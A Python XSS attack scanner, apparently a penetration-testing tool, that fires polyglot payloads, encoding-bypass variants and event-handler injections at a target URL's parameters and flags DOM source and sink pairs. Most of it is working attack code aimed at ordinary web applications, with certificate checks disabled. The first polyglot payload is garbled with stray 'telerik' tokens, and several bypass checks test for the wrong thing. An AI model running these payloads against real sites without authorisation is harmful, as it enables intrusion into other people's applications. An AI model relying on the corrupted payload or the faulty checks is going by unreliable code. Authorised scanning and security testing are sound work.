#!/usr/bin/env python3
"""Advanced XSS scanner: DOM-based detection, encoding bypass, polyglot payloads."""
import argparse
import re
import sys
from urllib.parse import urlparse, parse_qs, urlencode, quote

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik22//0x0telerik/\\",
    "'-alert(1)-'",
    "\"><img src=x onerror=alert(1)//",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)//",
    "\"'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "'-alert(1)//",
    "<details/open/ontoggle=alert(1)>",
]

ENCODING_BYPASSES = [
    ("html_entity", lambda p: p.replace("<", "&lt;").replace(">", "&gt;"), lambda p, r: p in r),
    ("double_encode", lambda p: quote(quote(p)), lambda p, r: p in r),
    ("unicode_escape", lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e"), lambda p, r: "<" in r and ">" in r),
    ("hex_encode", lambda p: p.replace("<", "%3C").replace(">", "%3E"), lambda p, r: "<" in r),
    ("null_byte", lambda p: p + "%00", lambda p, r: p.split("%00")[0] in r),
    ("tab_break", lambda p: p.replace("<", "<%09"), lambda p, r: "alert" in r),
    ("newline_break", lambda p: p.replace("<", "<%0a"), lambda p, r: "alert" in r),
]

# Patterns to detect dangerous DOM sinks in JavaScript (used for DETECTION only)
DOM_SINK_PATTERNS = [
    (r"document\.write\s*\(", "document.write"),
    (r"\.innerHTML\s*=", "innerHTML"),
    (r"\.outerHTML\s*=", "outerHTML"),
    (r"setTimeout\s*\(\s*['\"]", "setTimeout"),
    (r"setInterval\s*\(\s*['\"]", "setInterval"),
    (r"\.insertAdjacentHTML\s*\(", "insertAdjacentHTML"),
    (r"document\.location\s*=", "document.location"),
    (r"window\.location\s*=", "window.location"),
    (r"location\.href\s*=", "location.href"),
    (r"location\.replace\s*\(", "location.replace"),
    (r"location\.assign\s*\(", "location.assign"),
]

DOM_SOURCES = [
    (r"document\.URL", "document.URL"),
    (r"document\.referrer", "document.referrer"),
    (r"location\.hash", "location.hash"),
    (r"location\.search", "location.search"),
    (r"location\.href", "location.href"),
    (r"window\.name", "window.name"),
    (r"document\.cookie", "document.cookie"),
    (r"localStorage", "localStorage"),
    (r"sessionStorage", "sessionStorage"),
]

EVENT_HANDLERS = [
    "onload", "onerror", "onclick", "onmouseover", "onfocus", "onblur",
    "onsubmit", "onchange", "oninput", "onkeyup", "onkeydown", "onkeypress",
    "ontoggle", "onanimationend", "onhashchange", "onpageshow",
]

CANARY = "xSsErCaNaRy"


def check_dom_xss(html):
    findings = []
    scripts = re.findall(r"<script[^>]*>(.*?)</script>", html, re.S | re.I)
    all_js = "\n".join(scripts)
    found_sources = []
    found_sinks = []
    for pattern, name in DOM_SOURCES:
        if re.search(pattern, all_js, re.I):
            found_sources.append(name)
    for pattern, name in DOM_SINK_PATTERNS:
        if re.search(pattern, all_js, re.I):
            found_sinks.append(name)
    if found_sources and found_sinks:
        findings.append({"type": "DOM XSS (potential)", "severity": "HIGH",
                         "detail": f"Sources: {', '.join(found_sources)} -> Sinks: {', '.join(found_sinks)}"})
    elif found_sinks:
        findings.append({"type": "DOM Sinks found", "severity": "MEDIUM",
                         "detail": f"Sinks: {', '.join(found_sinks)} (verify manually)"})
    return findings


def check_reflection_context(html, canary):
    contexts = []
    idx = 0
    while True:
        idx = html.find(canary, idx)
        if idx == -1:
            break
        before = html[max(0, idx - 100):idx]
        if re.search(r"<script[^>]*>[^<]*$", before, re.I):
            contexts.append("javascript")
        elif re.search(r'=["\'][^"\']*$', before):
            contexts.append("attribute")
        elif re.search(r"<!--", before) and "-->" not in before[before.rfind("<!--"):]:
            contexts.append("html_comment")
        elif re.search(r"<style[^>]*>[^<]*$", before, re.I):
            contexts.append("css")
        else:
            contexts.append("html_body")
        idx += len(canary)
    return list(set(contexts))


def test_reflected_xss(session, url, params, timeout):
    findings = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in params:
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        test_params[param] = CANARY
        try:
            resp = session.get(base, params=test_params, timeout=timeout, verify=False)
            if CANARY not in resp.text:
                continue
        except Exception:
            continue

        contexts = check_reflection_context(resp.text, CANARY)
        findings.append({"type": "Reflection", "severity": "INFO", "param": param,
                         "detail": f"Input reflected in: {', '.join(contexts)}"})

        for payload in POLYGLOT_PAYLOADS:
            test_params[param] = payload
            try:
                resp = session.get(base, params=test_params, timeout=timeout, verify=False)
                if payload in resp.text:
                    findings.append({"type": "Reflected XSS", "severity": "HIGH", "param": param,
                                     "detail": f"Unfiltered: {payload[:50]}"})
            except Exception:
                continue

        for enc_name, encode_fn, check_fn in ENCODING_BYPASSES:
            base_payload = "<script>alert(1)</script>"
            encoded = encode_fn(base_payload)
            test_params[param] = encoded
            try:
                resp = session.get(base, params=test_params, timeout=timeout, verify=False)
                if base_payload in resp.text:
                    findings.append({"type": "XSS Encoding Bypass", "severity": "HIGH", "param": param,
                                     "detail": f"Bypass via {enc_name}: payload decoded in response"})
            except Exception:
                continue

        for handler in EVENT_HANDLERS[:6]:
            payload = f'" {handler}="alert(1)" x="'
            test_params[param] = payload
            try:
                resp = session.get(base, params=test_params, timeout=timeout, verify=False)
                if f'{handler}="alert(1)"' in resp.text or f"{handler}=alert(1)" in resp.text:
                    findings.append({"type": "Event Handler Injection", "severity": "HIGH", "param": param,
                                     "detail": f"Handler {handler} injectable"})
            except Exception:
                continue

    return findings


def main():
    ap = argparse.ArgumentParser(description="XSSer-lite: Advanced XSS scanner")
    ap.add_argument("target", help="Target URL with params (e.g., http://example.com/page?q=test)")
    ap.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    ap.add_argument("--dom-only", action="store_true", help="Only check for DOM-based XSS")
    ap.add_argument("--no-encoding", action="store_true", help="Skip encoding bypass tests")
    args = ap.parse_args()

    target = args.target if args.target.startswith("http") else f"https://{args.target}"
    parsed = urlparse(target)
    params = parse_qs(parsed.query, keep_blank_values=True)

    session = requests.Session()
    session.headers["User-Agent"] = "PhantomStrike/1.0 XSSer-Lite"

    print(f"[*] XSSer-Lite: Advanced XSS Scanner")
    print(f"[*] Target: {target}")
    print(f"[*] Parameters: {list(params.keys()) if params else 'none'}")
    print(f"[*] Polyglot payloads: {len(POLYGLOT_PAYLOADS)}")
    print(f"[*] Encoding bypasses: {len(ENCODING_BYPASSES)}\n")

    all_findings = []

    print("[*] Phase 1: DOM-based XSS analysis...")
    try:
        resp = session.get(target, timeout=args.timeout, verify=False)
        dom_findings = check_dom_xss(resp.text)
        for f in dom_findings:
            print(f"  [{f['severity']}] {f['type']}: {f['detail']}")
        all_findings.extend(dom_findings)
    except Exception as e:
        print(f"  [!] Error: {e}")

    if not args.dom_only and params:
        print(f"\n[*] Phase 2: Reflected XSS testing ({len(params)} params)...")
        reflected = test_reflected_xss(session, target, params, args.timeout)
        for f in reflected:
            print(f"  [{f['severity']}] {f['type']} in '{f['param']}': {f['detail'][:60]}")
        all_findings.extend(reflected)
    elif not params:
        print("\n[!] No URL parameters to test for reflected XSS")

    print(f"\n{'='*60}")
    print(f"[*] SCAN RESULTS")
    print(f"{'='*60}\n")

    vuln_findings = [f for f in all_findings if f["severity"] != "INFO"]
    info_findings = [f for f in all_findings if f["severity"] == "INFO"]
    if vuln_findings:
        for i, f in enumerate(vuln_findings, 1):
            pstr = f" (param: {f['param']})" if "param" in f else ""
            print(f"  [{f['severity']}] #{i} {f['type']}{pstr}")
            print(f"    {f['detail']}\n")
    if info_findings:
        print("  Informational:")
        for f in info_findings:
            print(f"    [INFO] {f['detail']}")
    if not all_findings:
        print("  [OK] No XSS vulnerabilities detected\n")

    high = sum(1 for f in all_findings if f["severity"] == "HIGH")
    med = sum(1 for f in all_findings if f["severity"] == "MEDIUM")
    print(f"\n[*] Total: {len(all_findings)} findings ({high} HIGH, {med} MEDIUM)")


if __name__ == "__main__":
    main()
